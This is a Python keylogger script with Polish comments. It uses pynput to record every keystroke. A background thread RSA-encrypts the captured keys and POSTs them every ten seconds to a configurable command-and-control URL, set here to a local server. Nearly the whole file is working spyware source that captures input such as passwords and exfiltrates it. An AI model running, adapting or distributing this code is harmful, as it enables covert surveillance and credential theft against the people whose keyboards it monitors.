from pynput import keyboard
from datetime import datetime
import threading
import time
import requests
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes

# --- Konfiguracja ---
C2_URL = "http://127.0.0.1:5000/log"  # Adres naszego serwera C2
LOG_INTERVAL = 10  # Co ile sekund wysyłać logi
# --------------------

key_buffer = []
lock = threading.Lock()

def load_public_key():
    """Wczytuje klucz publiczny z pliku PEM."""
    with open("public_key.pem", "rb") as key_file:
        public_key = serialization.load_pem_public_key(
            key_file.read()
        )
    return public_key

# Wczytanie klucza publicznego przy starcie
PUBLIC_KEY = load_public_key()

def encrypt_data(data: str) -> bytes:
    """Szyfruje dane przy użyciu klucza publicznego RSA."""
    encrypted = PUBLIC_KEY.encrypt(
        data.encode('utf-8'),
        padding.OAEP(
            mgf=padding.MGF1(algorithm=hashes.SHA256()),
            algorithm=hashes.SHA256(),
            label=None
        )
    )
    return encrypted

def send_logs():
    """Okresowo wysyła zebrane klawisze do serwera C2."""
    while True:
        time.sleep(LOG_INTERVAL)
        with lock:
            if not key_buffer:
                continue

            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            log_data = f"{timestamp}: {''''''.join(key_buffer)}"
            
            try:
                encrypted_log = encrypt_data(log_data)
                
                # Wysłanie danych do serwera C2
                response = requests.post(C2_URL, data=encrypted_log, headers={'Content-Type': 'application/octet-stream'})
                
                if response.status_code == 200:
                    print(f"Logi wysłane pomyślnie.")
                    key_buffer.clear() # Czyścimy bufor tylko po pomyślnym wysłaniu
                else:
                    print(f"Błąd podczas wysyłania logów: {response.status_code}")

            except Exception as e:
                print(f"Wystąpił błąd podczas szyfrowania lub wysyłania: {e}")

def on_press(key):
    """Rejestruje naciśnięcie klawisza."""
    try:
        with lock:
            key_buffer.append(key.char)
    except AttributeError:
        # Obsługa klawiszy specjalnych (np. spacja, enter)
        special_key_map = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "",
            keyboard.Key.tab: "	"
        }
        key_str = special_key_map.get(key, f"[{key.name}]")
        with lock:
            key_buffer.append(key_str)

def on_release(key):
    """Kończy działanie po naciśnięciu ESC."""
    if key == keyboard.Key.esc:
        # Zatrzymaj nasłuchiwanie
        return False

# Uruchomienie wątku wysyłającego logi w tle
sending_thread = threading.Thread(target=send_logs, daemon=True)
sending_thread.start()

print("Keylogger uruchomiony. Naciśnij ESC, aby zakończyć.")

# Uruchomienie nasłuchiwania klawiszy
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

print("Keylogger zatrzymany.")
